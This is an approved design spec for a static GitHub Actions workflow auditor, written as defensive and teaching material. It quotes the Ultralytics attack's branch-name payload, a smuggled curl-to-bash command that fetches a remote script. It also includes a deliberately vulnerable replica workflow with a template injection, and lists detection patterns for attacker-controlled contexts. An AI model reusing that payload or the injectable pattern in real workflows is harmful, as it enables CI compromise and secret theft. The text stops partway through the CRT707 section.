# C7: CI workflow auditor (`cartographer ci`)

> **Status:** Approved spec, revision 1 (2026-11-03). Parts marked **Provisional** depend on a spike in [08](../08-spikes-and-risks.md) or on facts to confirm while writing the concept notes.
> **Size:** M · **Version at end:** 0.7.0 · **Depends on:** M0 and **C3** (suppression grammar, the `SuppressionProvider` protocol of D-051, CRT004/CRT005, the `__init_subclass__` registry pattern, and the `class-registries` concept note) · **Research:** §2.11 (Ultralytics), §00 row "CI workflow auditor" (zizmor, poutine, octoscan, actionlint).
> **Package:** `src/cartographer/ci/` · **Codes:** CRT701–CRT708 ([03 §6](../03-cli-config-output.md#crt7xx-ci-workflows-c7))

---

## 1. Summary

`cartographer ci` reads a repository's GitHub Actions workflows (`.github/workflows/*.yml`) and any **local** composite actions and reusable workflows they use. It builds a typed model of triggers, jobs, steps and permissions, scans every `${{ … }}` expression, and reports the patterns behind the Ultralytics attack: dangerous triggers that check out pull-request code (CRT701), attacker-controlled text expanded into shell scripts (CRT702), caches restored in release jobs (CRT703), release jobs without an approval gate (CRT704), actions not pinned to a commit (CRT705), over-broad token permissions (CRT706), persisted checkout credentials (CRT707), and files that can't be parsed (CRT708). Everything is static. Nothing is fetched from the network and no workflow is run.

## 2. Why this matters

### 2.1 The incident (research §2.11)
In December 2024 an attacker compromised `ultralytics` without stealing anyone's password:
1. The repo had a workflow triggered by **`pull_request_target`**. That trigger runs in the context of the *target* repository, **with its secrets and a write-capable token**, even when the pull request comes from a stranger's fork.
2. The workflow called a composite action that ran `git pull origin ${{ github.head_ref }}`. `${{ … }}` is replaced with text **before** the shell sees the script. The attacker named their branch something like `` $({curl,-sSfL,raw.githubusercontent.com/…/file.sh}${IFS}|${IFS}bash) ``. So the "branch name" became shell code, and it ran.
3. The code stole tokens and (most likely) poisoned the **build cache** used by the release workflow.
4. A commit removed the actor check on the publish workflow, and the project's own Trusted Publishing then shipped malicious releases **with valid attestations** (that half of the story is C6's).

Every step is a pattern a static tool can spot in YAML. William Woodruff's analysis of the incident (research §8) led to the auditor **zizmor**, which is our reference.

### 2.2 Why build our own
Writing the auditor teaches you how Actions actually work (triggers, contexts, tokens, composite actions), why string templating into shells is dangerous (the same lesson as C5's SQL injection, in a different language), and how YAML parsing really works, including its famous traps.

## 3. Read before starting

### 3.1 Concept notes
Already written: `ast-basics` (tree-walking ideas transfer), `git-and-github-actions-basics` (M0), `injection-attacks` and `dataflow-and-taint` (C5), `class-registries` (C3).

> **Pull-forward variant (07 §1).** If C7 is done right after C3, before C5 exists: C7 writes `injection-attacks` and `dataflow-and-taint` as **short stubs** (one page each: the idea, one SQL and one shell example, and a "to be expanded in C5" banner), and C5 expands them later. Nothing else in this spec depends on C4, C5 or C6, so the rest of the milestone is unchanged.

Written in this milestone (owner C7, curriculum Stage 7): `github-actions-model`, `yaml-and-its-traps`, `actions-expressions`, `ci-attack-patterns`.

### 3.2 Prediction questions (`docs/learn/predictions/C7.md`)
1. What's the difference between `pull_request` and `pull_request_target`? Which one sees the repository's secrets when a fork opens a PR?
2. In `run: echo "${{ github.head_ref }}"`, the expression is inside double quotes. Is that safe? Why or why not?
3. If you instead write `env: BRANCH: ${{ github.head_ref }}` and `run: echo "$BRANCH"`, is that safe? What changed?
4. Which of these can a stranger control: the PR title, the PR's head commit SHA, the branch name, your repository's name, the commit message?
5. `uses: actions/checkout@v4`: what is `v4`, who can change what it points to, and why does pinning to a 40-character SHA help?
6. Guess what Python's YAML parser returns for the key in `on: push`. (The answer surprises most people.)
7. Why would a cache restored in a release job be dangerous if a PR-triggered workflow could write to the same cache?
8. What does a GitHub "environment" with required reviewers add to a publishing job?
9. If a workflow has no `permissions:` block at all, what permissions does its token get? (Guess, then look up "default GITHUB_TOKEN permissions".)
10. Cartographer won't download remote actions. Would it have caught the Ultralytics injection, given the vulnerable composite action lived in a *different* repository? What would it catch?

## 4. Scope

### 4.1 In scope
- Files: `<root>/.github/workflows/*.yml|*.yaml` (top level only, like GitHub itself), `<root>/action.yml|action.yaml` (the repo *is* an action), and **local** composite actions/reusable workflows referenced as `uses: ./…`.
- A YAML loader on PyPI's `yaml.compose()` + `SafeLoader` with exact positions (D-026).
- A typed workflow model, a hand-written `${{ }}` expression tokenizer, parser and taint evaluator, and rules CRT701–708.
- Suppression comments in YAML.
- Output in text/json/sarif. Dogfooding on our own `.github/`.

### 4.2 Out of scope (and why)
| Out | Why |
|---|---|
| Fetching remote actions / remote reusable workflows | Needs network and GitHub API auth, and turns a static tool into a crawler. We report what is *visible*. You can run `cartographer ci` on a checkout of the action's own repo (§6.6 handles repos that are actions). |
| Checking whether a pinned SHA really belongs to the named repo ("impostor commits" from forks) | Needs the GitHub API. Noted in CRT705's explain text. |
| GitLab CI, Azure Pipelines, CircleCI | GitHub Actions only (scope control, R-11). |
| Repository settings (default token permissions, branch protection, environment reviewers) | Not visible in files. CRT706/CRT704 explain texts say what to check by hand. |
| Shell-script analysis beyond finding `${{ }}` and a few publish commands | A full shell parser is a project of its own. |
| Diffing workflows over git history (for example "actor check removed") | Interesting, but needs git-history access. Stretch S7-2. |

## 5. User-facing behaviour

### 5.1 Synopsis
```
cartographer ci [PATH] [--strict] [--format text|json|sarif]
```
- `PATH` is a repository root (default `.`), or a single workflow / `action.yml` file. For a file, the repo root is the nearest ancestor (up to 5 levels) containing a `.github` directory. If there is none, it's the file's directory. Local `./` references resolve against the repo root, the same as on GitHub, where `./` paths are relative to the checked-out workspace.
- **Always pass the repository root** (`cartographer ci .`), never `.github/`. With root `.github/`, the tool would look for `.github/.github/workflows`. That's why "nothing found" is an error and not a silent success (next bullet).
- **No workflows found:** if the root has no `.github/workflows/*.yml|*.yaml` and no root `action.yml|action.yaml`, `cartographer ci` logs a WARNING (`no GitHub Actions workflows found under <root>/.github/workflows; pass the repository root`) and exits **2** (`ProjectError`). `cartographer report` (C8) treats the same situation as an **empty CI section** ("No workflows found") and continues; it is not an error there.
- `--strict`: also report injection findings whose taint is only *unknown* (step outputs, `workflow_call` inputs with no local callers), and findings in workflows with internal-only triggers (§6.4.4).

### 5.2 Example: the Ultralytics replica (normative; golden test `tests/golden/ci/ultralytics_replica.txt`)

The fixture repo `tests/fixtures/replicas/ultralytics/repo/` contains exactly these three files (line numbers matter: they appear in the golden output).

`.github/workflows/format.yml`:
```yaml
name: Ultralytics Actions (replica)
on:
  pull_request_target:
    branches: [main]
permissions:
  contents: write
  pull-requests: write
jobs:
  format:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          repository: ${{ github.event.pull_request.head.repo.full_name }}
          ref: ${{ github.head_ref }}
      - uses: ./.github/actions/format
```
`.github/actions/format/action.yml`:
```yaml
name: Format (replica, reconstructed)
description: Stand-in for the composite action abused in the Ultralytics attack
runs:
  using: composite
  steps:
    - name: Commit and push changes
      shell: bash
      run: |
        git config --global user.name "replica-bot"
        git pull origin ${{ github.head_ref || github.ref }}
        git push
```
`.github/workflows/publish.yml`:
```yaml
name: Publish (replica)
on:
  push:
    branches: [main]
  workflow_dispatch:
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: write
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: pip
      - run: pip install build && python -m build
      - uses: pypa/gh-action-pypi-publish@release/v1
```
Expected output:
```
$ cartographer ci tests/fixtures/replicas/ultralytics/repo
.github/actions/format/action.yml:10:25: CRT702 [error] template injection: attacker-controlled github.head_ref is expanded into a shell script (reached from .github/workflows/format.yml via pull_request_target)
  help: pass the value through an environment variable instead: env: HEAD_REF: ${{ github.head_ref }} and use "$HEAD_REF" in the script
  related: .github/workflows/format.yml:16:9 (composite action called here)
.github/workflows/format.yml:3:3: CRT701 [error] dangerous trigger pull_request_target checks out pull request code (ref: ${{ github.head_ref }})
  help: use the pull_request trigger for untrusted code, or never check out the PR head in a pull_request_target workflow
  related: .github/workflows/format.yml:12:9 (checkout of the PR head)
.github/workflows/format.yml:12:9: CRT707 [info] actions/checkout persists credentials in the workspace
  help: add `with: persist-credentials: false` unless a later step needs to push
.github/workflows/format.yml:12:15: CRT705 [warning] action actions/checkout@v4 is not pinned to a commit SHA
  help: pin to a full commit SHA and keep the version in a comment: uses: actions/checkout@<40-char sha> # v4.x.y
.github/workflows/publish.yml:7:3: CRT704 [warning] release job publish has no environment gate
  help: add `environment: pypi` and configure required reviewers for that environment in the repository settings
.github/workflows/publish.yml:13:9: CRT707 [info] actions/checkout persists credentials in the workspace
  help: add `with: persist-credentials: false` unless a later step needs to push
.github/workflows/publish.yml:13:15: CRT705 [warning] action actions/checkout@v4 is not pinned to a commit SHA
  help: pin to a full commit SHA and keep the version in a comment: uses: actions/checkout@<40-char sha> # v4.x.y
.github/workflows/publish.yml:14:15: CRT705 [warning] action actions/setup-python@v5 is not pinned to a commit SHA
  help: pin to a full commit SHA and keep the version in a comment: uses: actions/setup-python@<40-char sha> # v5.x.y
.github/workflows/publish.yml:17:11: CRT703 [warning] cache restored in release job publish (actions/setup-python cache: pip)
  help: release jobs should build from a clean state; remove caching from jobs that publish
  related: .github/workflows/publish.yml:7:3 (release job)
.github/workflows/publish.yml:19:15: CRT705 [warning] action pypa/gh-action-pypi-publish@release/v1 is not pinned to a commit SHA
  help: pin to a full commit SHA and keep the version in a comment: uses: pypa/gh-action-pypi-publish@<40-char sha> # v1.x.y

Found 2 errors, 6 warnings, 2 info in 3 workflows (0.05 s).
```
(Golden tests normalise the `(N.NN s)` duration.) The summary noun is `workflows` (03 §2.1), and the count includes every YAML file audited: workflow files plus local action files. Notes on this output, each of which becomes a test:
- `format.yml` has a workflow-level `permissions:` block, so there's **no CRT706**. The `publish` job has its own block, so no CRT706 there either.
- The `help:` text for CRT705 derives the version-comment hint from the ref's **last `/`-separated segment**, when that segment matches `^v?\d+(\.\d+){0,2}$`: missing parts become `x` (`v4` → `v4.x.y`, `release/v1` → `v1.x.y`, `v4.2` → `v4.2.x`, `v4.2.1` → `v4.2.1`). Otherwise it prints `# <version>` (for example `@main`).
- **What the replica teaches about the real incident:** in the real attack, the composite action lived in a separate repository (`ultralytics/actions`, used as a *remote* action). Cartographer doesn't fetch remote actions, so on the real repo it would report CRT701 and CRT705 but **not** CRT702. CRT702 only appears when the action's own repo is audited (§6.6). The write-up must state this limitation plainly.

### 5.3 JSON payload
```json
{
  "workflows": [
    {"path": ".github/workflows/publish.yml", "name": "Publish (replica)",
     "triggers": ["push", "workflow_dispatch"], "privileged": false,
     "permissions": null,
     "jobs": [{"id": "publish", "release": true,
               "release_signals": ["uses:pypa/gh-action-pypi-publish", "permissions:id-token:write"],
               "environment": null,
               "permissions": {"id-token": "write", "contents": "write"},
               "uses": [{"ref": "actions/checkout@v4", "pinned": false},
                        {"ref": "actions/setup-python@v5", "pinned": false},
                        {"ref": "pypa/gh-action-pypi-publish@release/v1", "pinned": false}]}]}
  ],
  "actions": [{"path": ".github/actions/format/action.yml", "using": "composite",
               "callers": [".github/workflows/format.yml#format/1"]}],
  "remote_actions_not_analyzed": ["actions/checkout@v4", "actions/setup-python@v5",
                                  "pypa/gh-action-pypi-publish@release/v1"]
}
```

## 6. Design

### 6.1 Modules (`src/cartographer/ci/`)
| Module | Responsibility | Phase |
|---|---|---|
| `__init__.py` | exports `audit_workflows`, `CiResult` | P1 |
| `yaml_loader.py` | `compose()` → our `YNode` tree with exact positions; merge keys; limits; duplicate keys | P1 |
| `model.py` | `Workflow`, `Trigger`, `Permissions`, `Job`, `Step`, `ActionRef`, `Text`, `CompositeAction` | P1 |
| `build.py` | `YNode` → model (validation → CRT708) | P1 |
| `discover.py` | find the files; resolve local `./` references; caller graph | P1/P3 |
| `expressions.py` | find `${{ }}` spans; tokenizer; parser (expression AST) | P2 |
| `contexts.py` | attacker-controlled context patterns, privileged triggers, trigger families | P2 |
| `taint.py` | evaluate expression taint, incl. `env.*` resolution, composite input and reusable-workflow propagation | P2/P3 |
| `release.py` | release-job detection | P4 |
| `rules/base.py` | `WorkflowRule` registry (same `__init_subclass__` pattern as C3's `Rule`) | P1 |
| `rules/crt701_dangerous_trigger.py` … `rules/crt708_unparseable.py` | one module per code | P1–P4 |
| `suppress.py` | YAML comment suppressions | P4 |
| `cli/commands/ci.py` | wiring | P1 |

### 6.2 YAML loading (`yaml_loader.py`) and the `on:` trap
**Why not `yaml.safe_load`?** Two reasons. (1) We need the **line and column of every value** for diagnostics, and `safe_load` returns plain dicts with no positions. (2) YAML 1.1, which PyYAML implements, resolves the bare scalar `on` to the boolean `True`, so `safe_load("on: push")` gives `{True: 'push'}`, and GitHub's most important key silently becomes `True`. Working at the **node** level, we read each key's raw text (`ScalarNode.value == "on"`) and never let the resolver turn keys into booleans. The concept note `yaml-and-its-traps` demonstrates both.

```python
@dataclass(frozen=True, slots=True)
class Pos:
    line: int; column: int           # 1-based (PyYAML marks are 0-based → +1)
    index: int                       # 0-based character offset into the file text

@dataclass(frozen=True, slots=True)
class YScalar:
    value: str                       # the decoded scalar text, never type-converted
    style: Literal["plain", "single", "double", "literal", "folded"]
    start: Pos; end: Pos

@dataclass(frozen=True, slots=True)
class YMap:
    items: tuple[tuple[YScalar, "YNode"], ...]   # keys are always scalars (complex keys → CRT708)
    start: Pos; end: Pos
    def get(self, key: str) -> "YNode | None": ...

@dataclass(frozen=True, slots=True)
class YSeq:
    items: tuple["YNode", ...]; start: Pos; end: Pos

type YNode = YScalar | YMap | YSeq
```
Algorithm:
1. Read bytes. If the file is > `ci.max-file-kb` (default 1024) → CRT708 `reason="too-large"`. Decode as UTF-8 (a BOM is allowed). Failure → CRT708 `reason="decode"`.
2. `yaml.compose_all(text, Loader=yaml.SafeLoader)`, **materialised inside one `try`** that maps every failure to CRT708 and never lets an exception escape:
   - zero documents, or more than one → `empty` / `multiple-documents`;
   - `yaml.MarkedYAMLError` (scanner, parser and composer errors) → `syntax`, located at `problem_mark` (or `context_mark`, or 1:1 when both are `None`);
   - `yaml.reader.ReaderError` (for example a forbidden control character) has **no** `problem_mark`. It has `position` (a character index), which becomes (line, column) via the line-start table → `reason="bad-character"`;
   - any other `yaml.YAMLError` → `syntax` at 1:1;
   - `RecursionError`: PyYAML's composer recurses once per nesting level, so `[[[[…]]]]` 10 000 levels deep overflows the stack *inside PyYAML* → `reason="too-deep"` at 1:1. As a pre-check, a cheap scan of the text rejects files whose bracket/indentation nesting exceeds `ci.max-yaml-depth` (default 200) before composing, so the common case never reaches the recursion limit.
3. **Convert iteratively** (an explicit stack of `(node, depth, ancestors)` work items, not Python recursion), so our own conversion can't overflow either:
   - Keep a counter of converted nodes. Above `ci.max-yaml-nodes` (default 50 000) → `reason="alias-expansion-limit"`. *Why:* `compose` keeps an alias as a *shared* node object, so a "billion laughs" document is small in memory but explodes if we naively expand it.
   - **Alias loops:** a document like `a: &x {b: *x}` composes into a node that **contains itself**. Converting it naively never ends. Each work item carries the set of `id()`s of its ancestor nodes. If a child's `id()` is already among its ancestors → `reason="recursive-alias"` at the alias's position, and that branch is replaced by an empty `YMap`. Shared-but-acyclic aliases are fine (converted once per use, and counted).
   - Depth above `ci.max-yaml-depth` → `reason="too-deep"`.
   - The conversion is linear in the number of converted nodes, which the node limit bounds.
4. **Merge keys** (`<<: *anchor`): for a `MappingNode` whose key node has tag `tag:yaml.org,2002:merge`, splice the referenced mapping's items in **before** the explicit items, so explicit keys win, per YAML 1.1 merge semantics. **Provisional:** the concept note confirms, from GitHub's docs, whether Actions accepts anchors and merge keys (GitHub added anchor support in 2025, but merge-key support must be verified). Whatever the answer, we parse merge keys (so we never miss a finding hidden behind one). If GitHub rejects them, we also log an INFO line ("GitHub may reject merge keys in <file>"). No diagnostic code is added for this.
5. **Duplicate keys** in one mapping (by raw key text) → CRT708 `reason="duplicate-key"` (warning), and the **last** occurrence wins (PyYAML's construct behaviour, kept for consistency).
6. Non-scalar mapping keys → CRT708 `reason="complex-key"`.

**Positions inside scalars.** `Text` (§6.3) keeps the scalar's `start.index` and `end.index`, so `raw = file_text[start.index:end.index]` is the exact source slice, including the `|` indicator and indentation for block scalars. To locate the *k*-th `${{` of a value, we find the *k*-th occurrence of `${{` in `raw`, add `start.index`, and convert the absolute index to (line, column) with the file's line-start table (binary search, O(log lines)). If the count of `${{` in `raw` and in `value` differ (rare escape cases in double-quoted scalars), we fall back to the scalar's start position, and `data.position_approximate = true`.

### 6.3 Workflow model (`model.py`)
```python
@dataclass(frozen=True, slots=True)
class Text:                          # a YAML string value with position info
    value: str; start: Pos; end: Pos; style: str
    def location(self, path: str) -> Location: ...
    def expr_location(self, path: str, k: int, file_text: str) -> Location: ...   # §6.2

@dataclass(frozen=True, slots=True)
class Trigger:
    event: str                       # "pull_request_target", "push", …
    key: Text                        # the key node (for locations)
    config: YNode | None             # filters, inputs, … (kept raw)

@dataclass(frozen=True, slots=True)
class Permissions:
    kind: Literal["map", "read-all", "write-all", "empty"]   # "empty" = `permissions: {}`
    scopes: Mapping[str, Literal["read", "write", "none"]]
    node: Text | None                # location of the `permissions` key

@dataclass(frozen=True, slots=True)
class ActionRef:
    raw: str                         # "actions/checkout@v4"
    kind: Literal["local", "remote", "docker"]
    owner: str | None; repo: str | None; subpath: str | None
    ref: str | None                  # "v4", a SHA, "release/v1"; for docker: tag or digest
    pinned: bool                     # remote: ref matches ^[0-9a-f]{40}$; docker: @sha256:<64 hex>; local: True

@dataclass(frozen=True, slots=True)
class Step:
    index: int                       # 0-based position in the job
    key: Pos                         # position of the step's first key (the "- uses"/"- name" line)
    name: Text | None
    uses: tuple[ActionRef, Text] | None
    run: Text | None
    shell: Text | None
    with_: Mapping[str, Text]        # non-string values are converted to their raw scalar text
    env: Mapping[str, Text]
    if_: Text | None

@dataclass(frozen=True, slots=True)
class Job:
    id: str; key: Text
    name: Text | None
    permissions: Permissions | None
    environment: Text | None         # `environment: x` or `environment: {name: x}` → the name
    uses: tuple[ActionRef, Text] | None  # reusable-workflow job
    with_: Mapping[str, Text]
    env: Mapping[str, Text]
    steps: tuple[Step, ...]

@dataclass(frozen=True, slots=True)
class Workflow:
    path: str                        # posix, relative to root
    text: str                        # full file text (for positions/suppressions)
    name: Text | None
    triggers: tuple[Trigger, ...]
    permissions: Permissions | None
    env: Mapping[str, Text]
    jobs: tuple[Job, ...]
    call_inputs: Mapping[str, Text | None]   # on.workflow_call.inputs → default (or None)

@dataclass(frozen=True, slots=True)
class CompositeAction:
    path: str; text: str
    using: str                       # "composite", "node20", "docker", …
    inputs: Mapping[str, Text | None]        # input name → default
    steps: tuple[Step, ...]          # only for composite
```
Building rules (`build.py`):
- `on` may be a string (`on: push`), a list (`on: [push, pull_request]`) or a mapping. All three normalise to `triggers`.
- `uses` parsing: `./…` → local. `docker://…` → docker. Otherwise `owner/repo[/subpath]@ref`. A missing `@ref` → CRT708 `reason="bad-uses"`.
- Non-string scalars in `with:`/`env:` (numbers, booleans) keep their raw text (`"3.11"`, `false`). Booleans are compared case-insensitively where rules need them (`persist-credentials: false` or `'false'`).
- Structural errors (missing `jobs`, a job that's not a mapping, `steps` not a list, a step with both `uses` and `run`, a step with neither) → CRT708 with a specific `reason`. Building continues with what is valid.

### 6.4 Expressions (`expressions.py`, `contexts.py`, `taint.py`)

#### 6.4.1 Finding expressions
Scan a string for `${{`. From there, scan forward tracking single-quoted string literals (`'…'`, where `''` is an escaped quote) until the first `}}` **outside** a string literal. If there's no closing `}}`, the expression is unterminated → recorded as unparseable (CRT708 `reason="bad-expression"`, warning). Several expressions per string are allowed. Complexity O(n).

#### 6.4.2 Tokenizer and grammar (hand-written; D-007)
Tokens: `IDENT` (`[A-Za-z_][A-Za-z0-9_-]*`, where hyphens are allowed as in `persist-credentials`), `NUMBER` (int/float/hex `0x…`/exponent), `STRING` (`'…'`), `TRUE`/`FALSE`/`NULL`, punctuation `( ) [ ] . , *`, operators `! < <= > >= == != && ||`. Whitespace is skipped.
Grammar (lowest to highest precedence), parsed with a small **Pratt parser** (the concept note explains precedence climbing):
```
expr     := or
or       := and ( "||" and )*
and      := cmp ( "&&" cmp )*
cmp      := unary ( ("=="|"!="|"<"|"<="|">"|">=") unary )*
unary    := "!" unary | postfix
postfix  := primary ( "." (IDENT | "*") | "[" expr "]" )*
primary  := literal | IDENT "(" args? ")" | IDENT | "(" expr ")"
```
AST nodes: `Lit(value)`, `Ref(path: tuple[str, ...])` for chains of `.name`, `['literal']` and `.*` / `[*]` (normalised to `"*"`), `Index(obj, expr)` for non-literal indexes, `Not(x)`, `Cmp(op, l, r)`, `And(l, r)`, `Or(l, r)`, `Call(name, args)`.
Example: `github.event['pull_request'].title` → `Ref(("github", "event", "pull_request", "title"))`.

#### 6.4.3 Taint values
```python
class Taint(IntEnum):     # ordered: the max of two taints is the "worse" one
    CLEAN = 0
    UNKNOWN = 1           # value comes from somewhere we can't see (step outputs, unknown callers)
    ATTACKER = 2          # an external attacker can choose this text

@dataclass(frozen=True, slots=True)
class TaintResult:
    level: Taint
    sources: tuple[str, ...]     # dotted context paths, e.g. ("github.head_ref",)
```
Evaluation rules (`taint.py`):
| Node | Result |
|---|---|
| `Lit` | CLEAN |
| `Ref` matching an **attacker-controlled pattern** (§6.4.4) | ATTACKER |
| `Ref` exactly `github.event`, `github`, or `github.event.pull_request` / `.issue` / `.comment` / `.review` / `.discussion` / `.workflow_run` (whole objects, usually via `toJSON`) | ATTACKER |
| `Ref` `env.NAME` | taint of the `env` value named `NAME`, looked up step → job → workflow (closest wins), evaluated recursively (depth ≤ 5, cycle-safe). Not found → CLEAN (set at runtime by `$GITHUB_ENV`, which we can't see; documented) |
| `Ref` `inputs.NAME` in a composite action or a `workflow_call` workflow | the taint of the caller's `with.NAME` (or the input's `default`), evaluated in the caller's context, taking the max over all local callers. No local callers → UNKNOWN |
| `Ref` `inputs.NAME` / `github.event.inputs.NAME` for `workflow_dispatch` | CLEAN by default (see the decision below) |
| `Ref` `steps.*.outputs.*`, `needs.*.outputs.*`, `jobs.*.outputs.*` | UNKNOWN |
| any other `Ref` (`github.sha`, `github.ref`, `github.repository`, `secrets.*`, `runner.*`, `matrix.*`, `vars.*`) | CLEAN |
| `Not`, `Cmp`, and `Call` to `contains`, `startsWith`, `endsWith`, `success`, `failure`, `always`, `cancelled`, `hashFiles` | CLEAN (these return booleans or hashes, so an attacker can't choose the *text*) |
| `Call` to `format`, `join`, `toJSON`, `fromJSON` | max over the arguments |
| `And(l, r)`, `Or(l, r)` | max(l, r): in Actions, `a \|\| b` evaluates to one of the operands' *values* |
| `Index(obj, e)` | max(obj, e) |
| unknown function | max over the arguments, and a DEBUG log |

**Decision recorded in this spec (D-039):** `workflow_dispatch` inputs are **not** attacker-controlled, because only users with write access can trigger `workflow_dispatch`. Config `ci.untrusted-dispatch-inputs = true` flips this for organisations where many people have write access. `workflow_call` inputs depend on the caller and are handled by propagation.

**Why `env:` is the fix.** In `env: {B: "${{ github.head_ref }}"}` plus `run: echo "$B"`, the expression is expanded into an *environment variable's value*, and the shell reads it as **data**. Only `${{ }}` text **inside `run:`** (or inside `with:` inputs that a composite action later places inside `run:`) gets pasted into the *script*. So CRT702 only fires for expressions inside `run:` scripts (and `actions/github-script`'s `with.script`, which is JavaScript source and has the same problem). Using `${{ }}` inside an `env:` value is never itself a finding.

#### 6.4.4 Attacker-controlled contexts and trigger families (`contexts.py`)
Patterns (`*` matches one path segment). **Provisional:** the concept note `actions-expressions` must cite GitHub's security-hardening docs for each entry, and fix the list if the docs differ.
```
github.head_ref
github.event.pull_request.title           github.event.pull_request.body
github.event.pull_request.head.ref        github.event.pull_request.head.label
github.event.pull_request.head.repo.default_branch
github.event.issue.title                  github.event.issue.body
github.event.comment.body                 github.event.review.body
github.event.review_comment.body
github.event.discussion.title             github.event.discussion.body
github.event.pages.*.page_name
github.event.commits.*.message            github.event.commits.*.author.email
github.event.commits.*.author.name        github.event.head_commit.message
github.event.head_commit.author.email     github.event.head_commit.author.name
github.event.workflow_run.head_branch     github.event.workflow_run.head_commit.message
github.event.workflow_run.head_commit.author.email
github.event.workflow_run.head_commit.author.name
github.event.workflow_run.pull_requests.*.head.ref
```
Not on the list, with reasons given in the concept note: `github.event.pull_request.head.sha` (hex only), `github.actor` (GitHub usernames are restricted to letters, digits and hyphens), repository full names (restricted character set).

Trigger families:
| Family | Events | Effect on CRT702 severity |
|---|---|---|
| **privileged** (untrusted input, *with* secrets and a write token) | `pull_request_target`, `workflow_run`, `issue_comment`, `issues`, `discussion`, `discussion_comment`, `merge_group` (**Provisional, S-15**) | **error** |
| **untrusted-unprivileged** (fork PRs run without secrets and with a read-only token) | `pull_request`, `pull_request_review`, `pull_request_review_comment` | **warning** |
| **internal** (only people with write access can cause them) | everything else: `push`, `schedule`, `workflow_dispatch`, `release`, `repository_dispatch`, … | not reported, unless `--strict` (then warning) |

**Why `merge_group` is privileged by default:** merge-queue runs execute in the base repository, on a temporary branch that contains PR content, and they may have access to secrets. Until spike S-15 confirms the exact token and secret rules, we take the safer classification. If S-15 shows it's unprivileged, the row moves and the spec is updated in the same PR.

A workflow's effective family is the **highest** across its triggers. A composite action or a `workflow_call` workflow takes the highest family across its local callers. With no local callers → **warning** (`data.callers = []`).

### 6.5 Rules
Each rule is a `WorkflowRule` subclass registered via `__init_subclass__` (pattern from C3, concept note `class-registries`) with `code`, `name`, and `check(ctx: AuditContext) -> Iterator[Diagnostic]`. `AuditContext` holds every loaded `Workflow` and `CompositeAction`, the caller graph and the config. Rules are pure functions of the context.

#### CRT701 `dangerous-trigger`
- **When:** the workflow's triggers include `pull_request_target` or `workflow_run`.
- **Error** if any job also **runs untrusted code**:
  - a step `uses: actions/checkout@*` whose `with.ref` contains a `Ref` to `github.head_ref`, `github.event.pull_request.head.sha`, `github.event.pull_request.head.ref`, `github.event.workflow_run.head_sha`, `github.event.workflow_run.head_branch`, or the text `refs/pull/`; **or** whose `with.repository` references `github.event.pull_request.head.repo.full_name`;
  - or a `run:` containing `gh pr checkout`, `git fetch … pull/`, or `git checkout`/`git pull` together with an ATTACKER-tainted expression;
  - or (`workflow_run` only) a step `uses: actions/download-artifact@*` with `with.run-id` referencing `github.event.workflow_run.id`, which is **artefact poisoning**, and `data.reason = "artifact-from-triggering-run"`.
- **Warning** otherwise ("dangerous trigger; no checkout of PR code detected; review carefully").
- One diagnostic per workflow per trigger. Location: the trigger key. Related: each offending step.
- `data`: `{"trigger": "pull_request_target", "checks_out_untrusted": true, "evidence": ["ref: ${{ github.head_ref }}"]}`.

#### CRT702 `template-injection`
- **When:** a `${{ }}` expression with taint ≥ ATTACKER (or ≥ UNKNOWN with `--strict`) appears inside a `run:` value (workflow or composite step), or inside `with.script` of `actions/github-script@*`, **and** the effective trigger family is reported per §6.4.4.
- One diagnostic per expression occurrence. Location: the exact `${{` position (§6.2). Related: the caller's `uses:` step for composites and reusable workflows.
- `data`: `{"sources": ["github.head_ref"], "taint": "attacker", "family": "privileged", "via": [".github/workflows/format.yml#format/1"], "sink": "run"}`.
- Message: `template injection: attacker-controlled <source> is expanded into a shell script` + ` (reached from <caller path> via <trigger>)` when it's reached through a caller.

#### CRT703 `cache-in-release-job`
- **When:** a job is a **release job** (§6.5.1) and has a step that restores a cache:
  - `uses: actions/cache@*` or `actions/cache/restore@*`;
  - or a setup action from the table below with a caching input set.

  | Action | Input | Counts as caching when |
  |---|---|---|
  | `actions/setup-python` | `cache` | non-empty |
  | `actions/setup-node` | `cache` | non-empty |
  | `actions/setup-java` | `cache` | non-empty |
  | `actions/setup-go` | `cache` | not `false`. **Provisional:** setup-go caches by default in recent major versions; confirm in the concept note |
  | `astral-sh/setup-uv` | `enable-cache` | `true` (or the default, if the concept note confirms the action enables caching by default) |

  Extra entries come from config `ci.cache-actions` (a table `"owner/repo" = "input-name"`).
- Location: the caching input key (or the `uses` value for `actions/cache`). Related: the job key.
- `data`: `{"job": "publish", "action": "actions/setup-python", "input": "cache", "value": "pip"}`.

#### 6.5.1 Release-job detection (`release.py`)
A job is a release job if **any strong signal** is present, or the **medium** signal is present (recorded as `data.confidence`):
- strong: a step `uses: pypa/gh-action-pypi-publish@*`, `softprops/action-gh-release@*`, `ncipollo/release-action@*`, or any action listed in `ci.release-actions`;
- strong: a `run:` matching (case-insensitive) `\b(twine\s+upload|uv\s+publish|poetry\s+publish|flit\s+publish|hatch\s+publish|pdm\s+publish|npm\s+publish|gh\s+release\s+(create|upload))\b`, or any regex in `ci.release-commands`;
- medium: the job's **effective** permissions include `id-token: write`. Effective means the job's own `permissions` if present, otherwise the workflow's. A job-level block **replaces** the workflow-level block, it doesn't merge with it, as on GitHub.
`release_signals` are recorded in the payload (§5.3).

#### CRT704 `missing-environment-gate`
- **When:** a release job has no `environment:`. Location: the job key. `data`: `{"job": "publish", "signals": [...]}`.

#### CRT705 `unpinned-action`
- **When:** a remote `uses` (step or reusable-workflow job) with `pinned == false`, and the `owner/repo` doesn't match any glob in `ci.allow-unpinned` (default `[]`, strict by default). Docker refs: pinned only with `@sha256:<64 hex>`. Local refs are never reported.
- Location: the `uses` **value**. `data`: `{"uses": "actions/checkout@v4", "ref": "v4", "ref_kind": "tag-or-branch"}`.
- The explain text mentions what we don't check: impostor commits, and whether the SHA comment matches the tag.

#### CRT706 `excessive-permissions`
- (a) The workflow has no top-level `permissions` and a job has no `permissions` → one diagnostic **per such job**, at the job key: `job <id> has no permissions block and gets the repository's default token permissions`. (b) `permissions: write-all` at any level → at that key: `permissions: write-all grants every scope write access`.
- `data`: `{"job": "...", "case": "missing" | "write-all"}`.
- Not reported: specific `write` scopes (they may be needed; listed in the payload instead).

#### CRT707 `persisted-credentials`
